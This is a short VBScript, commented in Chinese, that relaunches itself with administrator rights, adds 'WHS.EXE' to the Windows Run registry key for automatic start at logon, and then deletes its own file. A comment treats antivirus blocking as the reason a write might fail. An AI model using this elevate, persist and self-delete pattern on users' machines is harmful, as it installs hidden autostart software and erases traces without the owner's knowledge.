'VBS检测是否使用管理员运行
Set WshShell = WScript.CreateObject("WScript.Shell") 
If WScript.Arguments.Length = 0 Then 
    Set ObjShell = CreateObject("Shell.Application") 
    ObjShell.ShellExecute "wscript.exe" _ 
    , """" & WScript.ScriptFullName & """ RunAsAdministrator", , "runas", 1 
    WScript.Quit 
End if 
dim fso,f,ws
dim app,appPath
app="WHS.EXE"
Set fso=CreateObject("Scripting.FileSystemObject")
Set f=Fso.GetFile(WScript.ScriptFullName)
Set Ws=CreateObject("WScript.Shell")
appPath=f.ParentFolder.Path+"\"+app
'打印启动路径
'WScript.echo  appPath
'加入注册表，权限不足说明杀毒软件拦截
Ws.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WHS" ,appPath,"REG_SZ"
'删除自身文件
fso.DeleteFile WScript.ScriptFullName